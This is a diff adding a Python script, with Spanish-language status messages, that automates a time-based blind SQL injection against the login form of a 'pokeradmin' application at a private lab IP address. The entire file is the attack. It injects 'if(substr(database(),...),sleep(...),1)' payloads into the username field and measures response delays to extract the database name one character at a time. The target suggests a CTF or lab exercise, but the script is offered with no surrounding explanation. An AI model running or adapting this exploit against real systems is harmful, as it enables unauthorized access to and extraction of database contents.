@@ -1,0 +1,51 @@
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, time, sys, string
+
+def def_handler(sig, frame):
+    print ("\n\n[!] saliendo ... \n")
+    sys.exit(1)
+
+
+signal.signal(signal.SIGINT, def_handler)
+
+
+# globals
+mainURL = 'http://192.168.100.7/pokeradmin/index.php'
+payload = """ op=adminlogin&username=admin' and if(substr(database(),1,1)='a',sleep(5),1)-- - &password=admin"""
+characters = string.ascii_lowercase + string.digits + ":,_-."
+
+def SQLI_timebased():
+    data= ""
+    p1 = log.progress("SQLI")
+    p1.status("Iniciando ataque")
+    time.sleep(3)
+
+    p2 = log.progress("Data Extracted")
+
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+
+
+    for position in range(1, 12):
+        for character in characters:
+            post_data = {
+                'op': 'adminlogin',
+                'username': "admin' and if(substr(database(),%d,1)='%s',sleep(0.80),1)-- -" % (position, character),
+                'password': 'admin'
+            }
+            p1.status(post_data['username'])
+            timeStart = time.time()
+            r = requests.post(mainURL, data=post_data, headers=headers)
+            timeEnd = time.time()
+
+            if timeEnd - timeStart > .80:
+                data += character
+                p2.status(data)
+                break
+    p1.succes("completedo")
+    p2.succes(data)
+
+SQLI_timebased()
